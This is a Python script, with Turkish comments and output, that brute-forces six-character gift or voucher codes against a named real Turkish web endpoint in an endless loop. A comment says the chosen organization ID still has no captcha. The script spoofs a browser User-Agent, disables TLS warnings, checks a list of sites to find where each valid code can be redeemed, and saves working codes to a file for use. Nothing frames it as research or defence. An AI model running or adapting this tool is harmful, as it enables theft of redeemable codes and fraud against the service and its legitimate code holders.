import requests
from datetime import datetime
import time
import sys
import string
import random

import urllib3
urllib3.disable_warnings()

adres = "https://karabuk.hediyegb.com.tr/Transaction/CodeItemControlByCode?Code="
kere_denendi = 0

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.3"}
session = requests.Session()
randgen = random.SystemRandom()

sleep = time.sleep

def kodSalla():
    kod = ""
    for _ in range(6):
        kod += randgen.choice(string.ascii_uppercase + string.digits)
    return kod


def clear_line():
    print("\033[2K", end="")  # Clear entire line
    print("\033[1G", end="")  # Move cursor to the beginning of the line
    pass

def kodDene(kod):
    current_time = datetime.now()
    time_string = current_time.strftime("%H:%M:%S")

    print(f"\r[{time_string}][{str(kere_denendi)}] Kod {kod} Deneniyor... ", end="")
    try:
        response = session.get(adres + kod + "&OrganizationId=100206") # mehmet muşa ayarlı organizasyon id daha captcha yok şükür
    except:
        print("bağlantı hatası, tekrar deneniyor...")
        sleep(5)
        return
    if response.status_code == 200:
        json_data = response.json()
        
        if (json_data["isSuccess"] == False):
            print(f"Çalışmadı...", end="")
            sys.stdout.flush()
            time.sleep(0)
            clear_line()
            return
        elif (json_data["isSuccess"] == True):
            print(f"BULUNDU!!! {kod},guid {json_data['data']['guid']}, nerede calıştığı tespit ediliyor...", end="\n")
            time.sleep(2)
            
            kod_guid = json_data["data"]["guid"]
            kodNeredeCalisiyor(kod, kod_guid)
            return
        else:
            print(f"birşeyler oldu... veri={json_data}", end="\n")
            time.sleep(5)
            return

    else:
        print(f"Hata: Adrese erişilemedi", end="")
        time.sleep(0.1)
        clear_line()
        return

kontrol_adresleri = []
with open("adresler.txt", 'r') as file:
    for line in file:
        kontrol_adresleri.append(line.strip())

def kodNeredeCalisiyor(kod, guid):
    for numara, denenecek_adres in enumerate(kontrol_adresleri):
        current_time = datetime.now()
        time_string = current_time.strftime("%H:%M:%S")
        print(f"\r[{time_string}][{str(numara)}/{len(kontrol_adresleri)}] Adres {denenecek_adres} Deneniyor... ", end="")
        try:
            veri = session.get(denenecek_adres + "Home/IndexQr/?formId=0&code=" + guid, headers=headers)
        except:
            print("dns arızası herhalde?? oops")
            sleep(5)
            continue

        if veri.status_code == 500:
            print(f"Bu adres değil...", end="")
            sys.stdout.flush()
            sleep(0.5)
            clear_line()
        elif veri.status_code == 200:
            print(f"Siteyi de bulduk,son kontroller... ", end="")
            if not adresKodKontrol(denenecek_adres, kod):
                print(f"sitede çalışmıyor, diğer sitelerden devam ", end="")
                sleep(3)
                continue
            print(f"KOD BULUNMUŞTUR {kod} {denenecek_adres} İYİ GÜNLERDE KULLANIN!1!")
            dosyayaYaz(kod + " " + guid + " " + denenecek_adres)
            sleep(10)
            return
        else:
            print(f"sitede birşeyler oldu... {veri.status_code} {veri.text}", end="\n")
            sleep(5)
    print(f"Maalesef kodun neredeyse çalıştığını bulamadım komutanım...")
    sleep(10)

def adresKodKontrol(adres, kod):
    yanit = requests.get(adres + "Transaction/CodeItemControlByCode?Code=" + kod)
    if yanit.status_code != 200:
        return False
    veri = yanit.json()
    if veri["isSuccess"] == True:
        return True
    return False

def dosyayaYaz(content):
    current_time = datetime.now()
    baslama_zamani = current_time.strftime("%Y-%m-%d %H:%M:%S")
    with open("kodlar.txt", 'a') as file:
        file.write(f"[{baslama_zamani}] {content}\n")

if __name__ == "__main__":
    current_time = datetime.now()
    baslama_zamani = current_time.strftime("%H:%M:%S")
    print(f"epik internet jenerator 9000 başlıyor: {baslama_zamani}")
    while True:
        rasgelekod = kodSalla()
        kodDene(rasgelekod)
        kere_denendi += 1
